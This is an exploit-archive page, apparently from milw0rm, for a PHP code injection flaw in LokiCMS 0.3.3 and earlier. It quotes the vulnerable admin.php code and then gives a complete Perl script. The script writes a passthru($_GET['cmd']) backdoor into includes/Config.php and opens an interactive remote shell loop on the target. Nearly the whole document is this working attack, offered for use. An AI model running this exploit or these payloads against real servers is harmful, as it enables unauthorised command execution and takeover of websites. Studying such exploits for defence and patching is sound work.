<html><head><title>LokiCMS <= 0.3.3 Remote Command Execution Exploit</title></head><pre># Author:	__GiReX__
# mySite:	girex.altervista.org
# Date:		8/04/08

# CMS: 		LokiCMS &lt;= 0.3.3
# Site:		lokicms.com

# Bug: 		PHP Code Injection
# Exploit:	Remote Command Execution

# Vuln Code: admin.php

#	if ($_GET['default'] != '') { // User want's to set the default page
#		writeconfig($c_password, $c_title, $c_header, $c_tagline, $c_footnote, stripslashes($_GET['default']), #		$c_theme, $c_language, $c_modrewrite, $c_simplelink, $c_code);

# Our bugged var $_GET['default'] is stripslashed so we don't need magic_quotes_gpc Off
# writeconfig() simply put text into Config.php

# This is a very bugged CMS, only most dengerous bug is here reported



#!/usr/bin/perl -w
# LokiCMS &lt;= 0.3.3 Remote Command Execution Exploit
# Works with magic_quotes_gpc = On
# Coded by __GiReX__

use LWP::Simple;

if(not defined $ARGV[0])
{
     banner();
     print &quot;[-] Usage: perl $0 [host] [path]\n&quot;;
     print &quot;[-] Example: perl $0 localhost /lokicms/\n\n&quot;;
     exit;
}
 
my $host  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
   $host .=  $ARGV[1] unless not defined $ARGV[1];

banner();
get($host.'admin.php?default=\';passthru($_GET[\'cmd\']);//') or die '[-] Error requesting page: admin.php';

while(1)
{
     print &quot;[+] Shell:~\$ &quot;;
     chomp($cmd = &lt;STDIN&gt;);
     last if $cmd eq 'exit';
     last if is_error(getprint($host.&quot;includes/Config.php?cmd=${cmd}&quot;));
     print $resp;
}

sub banner
{
     print &quot;[+] LokiCMS &lt;= 0.3.3 Remote Command Execution Exploit\n&quot;;
     print &quot;[+] Coded by __GiReX__\n&quot;;
     print &quot;\n&quot;;
}

# milw0rm.com [2008-04-08]</pre></html>